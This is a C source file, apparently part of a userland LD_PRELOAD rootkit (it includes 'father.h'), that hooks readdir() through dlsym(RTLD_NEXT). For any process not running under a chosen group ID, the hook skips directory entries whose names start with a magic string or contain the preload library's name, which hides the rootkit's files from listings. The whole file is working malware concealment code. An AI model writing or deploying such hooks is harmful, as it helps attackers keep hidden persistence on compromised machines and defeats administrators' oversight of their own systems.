#include "father.h"

/*
 * readdir() hook, hide based on the magic STRING.
*/
struct dirent * (*o_readdir)(DIR *);
struct dirent * readdir(DIR *p) {

	#ifdef DEBUG
	fprintf(stderr, "readdir() called!\n");
	#endif

	if(!o_readdir) o_readdir = dlsym(RTLD_NEXT, "readdir");

	if(getegid() == GID) return o_readdir(p);

	struct dirent * dir = o_readdir(p);
	if(dir) {
		if (!strncmp(dir->d_name, STRING, strlen(STRING)) || strstr(dir->d_name, PRELOAD)){
			dir = o_readdir(p);
		}
	}
	return dir;
}
